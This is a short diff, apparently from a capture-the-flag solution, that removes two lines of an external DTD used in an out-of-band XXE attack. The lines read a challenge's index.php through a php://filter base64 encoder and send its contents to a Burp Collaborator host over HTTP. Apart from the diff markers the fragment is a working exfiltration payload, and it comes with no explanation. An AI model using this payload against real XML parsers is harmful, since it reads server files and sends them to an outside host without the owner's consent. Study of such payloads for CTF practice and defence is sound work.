@@ -1,2 +1,0 @@
-<!ENTITY % d SYSTEM "php://filter/convert.base64-encode/resource=/challenge/web-serveur/ch29/index.php">
-<!ENTITY % c "<!ENTITY rrr SYSTEM 'http://9isvphyn0e9nu8jnwxmaeiplpcv2jr.burpcollaborator.net/%d;'>"> 
